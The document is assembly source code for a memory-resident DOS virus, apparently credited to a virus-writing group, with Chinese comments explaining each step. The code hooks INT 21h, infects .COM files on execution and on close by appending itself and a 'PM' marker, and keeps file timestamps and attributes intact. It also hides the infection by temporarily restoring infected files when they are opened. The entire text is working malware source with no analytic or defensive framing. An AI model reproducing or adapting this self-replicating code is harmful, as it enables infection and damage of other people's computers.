ABOMB   SEGMENT                 ; Writton By Poison Maker of TPVO
        ASSUME  CS:ABOMB,DS:ABOMB
        ORG     0h
START:
        CALL    $+3             ;  得到病毒程式開頭的區段位置
        POP     SI
        SUB     SI,3

        MOV     DI,100h         ;  將DI設為100h,並且堆疊起來
        PUSH    DI

        MOV     AH,99h          ;  判斷INT 21h是否已經攔下來了
        INT     21h
        CMP     AH,66h
        JNZ     INSTALL

        ADD     SI,OFFSET FILE_DATA   ;   將原來的程式開頭恢復
        MOV     CX,5                  ;   並且返回執行
        REP     MOVSB
        XOR     SI,SI
        XOR     DI,DI
        XOR     CX,CX
        XOR     BX,BX
        XOR     AX,AX
        RET

INSTALL:
        MOV     AH,52h                 ;   得到記憶體控制區段的起啟位置
        INT     21h
        MOV     BX,WORD PTR ES:[BX-2]

LOOP_1:
        MOV     ES,BX                  ;   記錄記憶體控制區段的最後位置
        ADD     BX,ES:[3]              ;
        INC     BX                     ;   4Dh代表下面還有記憶體區段
        CMP     BYTE PTR ES:[0],5Ah    ;   5Ah代表已經是最後一個
        JNZ     LOOP_1
        MOV     AX,ES
        MOV     ES,BX
        CMP     BYTE PTR ES:[0],4Dh
        JZ      LOOP_2
        MOV     ES,AX
        JMP     OVER
LOOP_2:
        MOV     ES,BX
        ADD     BX,WORD PTR ES:[3]
        INC     BX
        CMP     BYTE PTR ES:[0],4Dh
        JZ      LOOP_2

OVER:
        MOV     BX,ES:[3]                ;  將最後一個區段的記憶體剩餘的長度
        MOV     AX,OFFSET POISON_END+0Fh ;  減少病毒程式的長度(單位16Bytes)
        MOV     CL,4                     ;  並且將病毒本身複製一份到那堙C
        SHR     AX,CL
        SUB     BX,AX
        MOV     ES:[3],BX
        MOV     AX,ES
        ADD     BX,AX
        XOR     DI,DI
        MOV     ES,BX
        MOV     CX,OFFSET POISON_END
        REP     MOVSB

        PUSH    ES
        POP     DS

        MOV     AX,3521h                  ;   攔下INT 21h
        INT     21h
        MOV     WORD PTR DS:OLD21_I,BX
        MOV     WORD PTR DS:OLD21_C,ES
        MOV     AH,25h
        MOV     DX,OFFSET INT21
        INT     21h

        PUSH    CS                        ;  恢復DS,ES，並且返回主程式
        PUSH    CS
        POP     DS
        POP     ES
OVER1:
        RET

INT21:       ;  攔到的INT 21h起啟位置
        CMP     AH,99h
        JNZ     I1                        ;  判斷AH是否為99h
        MOV     AH,66h                    ;  是則將AH改為66h
        IRET                              ;  並且返回原程式

I1:
        CMP     AH,3Dh                    ;  判斷是否使用AH,3Dh功能
        JNZ     I2
        JMP     AH_3D

I2:
        CMP     AH,3Eh                    ;  判斷是否使用AH,3Eh功能
        JNZ     I3
        JMP     AH_3E
I3:
        CMP     AX,4B00h                  ;  判斷是否使用AX,4B00h功能
        JNZ     EXIT_21
        JMP     AX_4B00

EXIT_21:
        DB      0EAh
OLD21_I DW      ?                         ;  真正的INT 21h的位置
OLD21_C DW      ?

AX_4B00:            ;攔AX,4B00h的執行檔案功能
        PUSH    AX                 ; 堆疊 AX,BX,CX,DX,ES,DS
        PUSH    BX
        PUSH    CX
        PUSH    DX
        PUSH    ES
        PUSH    DS

        PUSH    DX                 ;將檔案屬性保存
        PUSH    DS
        MOV     AX,4300h
        CALL    I21
        PUSH    CX

        MOV     AX,3D02h            ;開檔
        CALL    I21
        JB      FILE_OVER

        XCHG    BX,AX

        PUSH    CS                  ;將DS設為現在(CS)的位置
        POP     DS

        MOV     AH,3Fh                    ;讀取檔案開頭的5 Bytes
        MOV     CX,5
        MOV     DX,OFFSET DS:FILE_DATA
        CALL    I21

        MOV     AX,WORD PTR DS:FILE_DATA      ;判斷是否為EXE 檔
        ADD     AL,AH                         ;已經感染的檔案
        CMP     AL,'M'+'Z'                    ;是則跳到關檔的位置
        JZ      FILE_END
        CMP     WORD PTR DS:FILE_DATA[3],'MP'
        JZ      FILE_END

        MOV     AX,5700h                   ; 將原來的時間保存
        CALL    I21
        PUSH    CX
        PUSH    DX

        MOV     AX,4202h                   ; 將讀寫指標設為檔案後面
        XOR     CX,CX
        XOR     DX,DX
        CALL    I21

        SUB     AX,3                          ;  將檔案長度減3(即是JMP xxxx
        MOV     WORD PTR DS:START_DATA[1],AX  ;  的位置)保存。

        MOV     AH,40h                        ;寫入病毒程式
        MOV     CX,OFFSET POISON_END
        CALL    I21

        MOV     AX,4200h                      ;  將讀寫指標設為檔案開頭
        XOR     CX,CX
        XOR     DX,DX
        CALL    I21

        MOV     AH,40h                        ; 寫入資料(JMP xxxx PM)
        MOV     CL,5                          ;         ^^^^^^^^^ ^^^
        MOV     DX,OFFSET DS:START_DATA       ;     跳到病毒開始  檔案標記
        CALL    I21

        POP     DX                           ;  恢復原來的寫檔日期
        POP     CX
        MOV     AX,5701h
        CALL    I21

FILE_END:
        MOV     AH,3Eh                       ; 關閉檔案
        CALL    I21
FILE_OVER:
        POP     CX                          ;將檔案屬性恢復
        POP     DS
        POP     DX
        MOV     AX,4301h
        CALL    I21

        POP     DS                        ;取回原來的  DS,ES,DX,CX,BX,AX
        POP     ES
        POP     DX
        POP     CX
        POP     BX
        POP     AX

        JMP     EXIT_21                   ;執行真正的INT 21h

AH_3D:         ;開檔功能
        PUSH    BX                       ; 保存BX

        MOV     BX,DX                    ; 尋找檔案名稱是否有.COM
        MOV     BYTE PTR CS:MARK,0       ; 如果有.COM時 MARK = 1
        DEC     BX
SCAN_NAME:
        INC     BX
        CMP     BYTE PTR DS:[BX],0h
        JNZ     SCAN_NAME

        SUB     BX,2
        CMP     WORD PTR DS:[BX],'MO'
        JNZ     RUN_3D
        SUB     BX,2
        CMP     WORD PTR DS:[BX],'C.'
        JNZ     RUN_3D
        MOV     BYTE PTR CS:MARK,1
RUN_3D:
        POP     BX                       ; 恢復BX

        MOV     AX,3D02h                 ; 開檔
        CALL    I21

        JNC     RUN3D_1                  ;判斷開檔是否有錯誤
        JMP     EXIT_3D
RUN3D_1:
        PUSHF
        PUSH    BX

        CMP     BYTE PTR CS:MARK,1      ;判斷MARK=1
        JZ      RUN3D_2
        JMP     EXIT_MARK
RUN3D_2:
        XOR     BX,BX               ; 將檔案代號存入
        DEC     BX
F_N:
        INC     BX
        CMP     WORD PTR CS:F_NUMBER[BX],0
        JZ      F_N1
        CMP     BX,5
        JNZ     F_N
        JMP     EXIT_MARK
F_N1:
        MOV     WORD PTR CS:F_NUMBER[BX],AX

        PUSH    AX                  ; 保存AX,CX,DX,DS,ES
        PUSH    CX
        PUSH    DX
        PUSH    DS
        PUSH    ES

        XCHG    BX,AX

        MOV     AX,5700h            ;  保存寫檔日期
        CALL    I21
        PUSH    CX
        PUSH    DX

        PUSH    CS                 ; 將DS設為現在的區段(CS)
        POP     DS

        MOV     AH,3Fh               ; 讀取檔頭的5 Bytes
        MOV     CX,5
        MOV     DX,OFFSET FILE_DATA
        CALL    I21

        CMP     WORD PTR DS:FILE_DATA[3],'MP'    ;判斷是否有檔案標記
        JNZ     OVER_SCAN

                              ;  如果有標記，則將檔案恢復原來的程式內容

        MOV     AX,WORD PTR DS:FILE_DATA[1]  ; 讀取檔案的長度，並且堆疊
        ADD     AX,3
        PUSH    AX

        MOV     AX,4202h               ;  將讀寫指標設到檔案最後的5 Bytes
        MOV     CX,0FFFFh
        MOV     DH,0FFh
        MOV     DL,11111011b
        CALL    I21

        MOV     AH,3Fh                ; 讀取出來
        MOV     CX,5
        MOV     DX,OFFSET FILE_DATA
        CALL    I21

        MOV     AX,4200h              ; 將讀寫指標設到檔頭
        XOR     CX,CX
        XOR     DX,DX
        CALL    I21

        MOV     AH,40h                ; 將原程式的資料寫入
        MOV     CX,5
        MOV     DX,OFFSET FILE_DATA
        CALL    I21

        MOV     AX,4200h              ; 將讀寫指標設為原程式的最後
        XOR     CX,CX
        POP     DX
        CALL    I21

        MOV     AH,40h                 ; 寫入0 Byte
        XOR     CX,CX
        CALL    I21
OVER_SCAN:
        MOV     AX,4200h               ; 將讀寫指標恢復到開頭
        XOR     CX,CX
        XOR     DX,DX
        CALL    I21

        POP     DX                     ; 恢復原來的寫檔日期
        POP     CX
        MOV     AX,5701h
        CALL    I21

        POP     ES                    ;  恢復原來的ES,DS,DX,CX,AX
        POP     DS
        POP     DX
        POP     CX
        POP     AX
EXIT_MARK:
        POP     BX
        POPF
EXIT_3D:
        RETF    2                    ;  返回原來呼叫INT 21h的位置


AH_3E:         ;  關檔的功能
        PUSH    BX                 ;保存BX,DX
        PUSH    DX

        XCHG    DX,BX              ;判斷所關檔的檔案代號是否已標記
        XOR     BX,BX
        DEC     BX
L_NUMBER:
        INC     BX
        CMP     CS:F_NUMBER[BX],DX
        JZ      COM_FILE
        CMP     BX,5
        JNZ     L_NUMBER
        POP     DX
        POP     BX
        MOV     AH,3Eh
        JMP     EXIT_21

COM_FILE:
        MOV     CS:F_NUMBER[BX],0         ;  將標記的檔案代號消除

        POP     DX                        ; 恢復DX,BX
        POP     BX

        PUSH    DS                        ; 保存 DS

        PUSH    BX                        ; 保存 BX

        MOV     AH,45h                     ; 複製一個檔案代號
        CALL    I21

        PUSH    AX                         ; 將舊的檔案代號關閉
        POP     BX
        MOV     AH,3Eh
        CALL    I21
        POP     BX

        PUSH    CS               ;  將DS設為CS
        POP     DS

        MOV     AX,5700h           ;  保存原來的寫檔日期
        CALL    I21
        PUSH    CX
        PUSH    DX

        MOV     AX,4200h           ;  將讀寫指標設為檔頭
        XOR     CX,CX
        XOR     DX,DX
        CALL    I21

        MOV     AH,3Fh                ;讀取檔案的 5 Bytes
        MOV     CX,5
        MOV     DX,OFFSET FILE_DATA
        CALL    I21

        CMP     WORD PTR DS:FILE_DATA,'MP'  ; 判斷是否檔案已標記
        JZ      EXIT_3E

        MOV     AX,4202h                  ;  將讀寫指標設為檔尾
        XOR     CX,CX
        XOR     DX,DX
        CALL    I21

        SUB     AX,3                            ;保存(JMP xxxx)病毒開頭的長度
        MOV     WORD PTR DS:START_DATA[1],AX

        MOV     AH,40h                        ;  將病毒程式寫入檔尾
        MOV     CX,OFFSET POISON_END
        XOR     DX,DX
        CALL    I21

        MOV     AX,4200h                     ; 將讀寫指標設為檔頭
        XOR     CX,CX
        XOR     DX,DX
        CALL    I21

        MOV     AH,40h                    ; 寫入 ( JMP xxxx PM)的資料
        MOV     CX,5
        MOV     DX,OFFSET START_DATA
        CALL    I21

        POP     DX                       ; 恢復原來的寫檔日期
        POP     CX
        MOV     AX,5701h
        CALL    I21
EXIT_3E:
        MOV     AH,3Eh                  ; 關檔和恢復 DS
        POP     DS
        JMP     EXIT_21



I21     PROC    NEAR                   ;  此為 呼叫真正的INT 21h的副程式
        PUSHF
        CALL    DWORD PTR CS:EXIT_21
        RET
I21     ENDP


F_NUMBER        DW  5 DUP(?)                        ;  儲存檔案代號
MARK            DB  0                               ;  標記是否COM檔
START_DATA      DB  0E9h,?,?,'P','M'                ;  檔案開的資料
FILE_DATA       DB  0CDh,20h,?,?,?                  ;  原程式的資料

POISON_END:
ABOMB   ENDS
        END     START

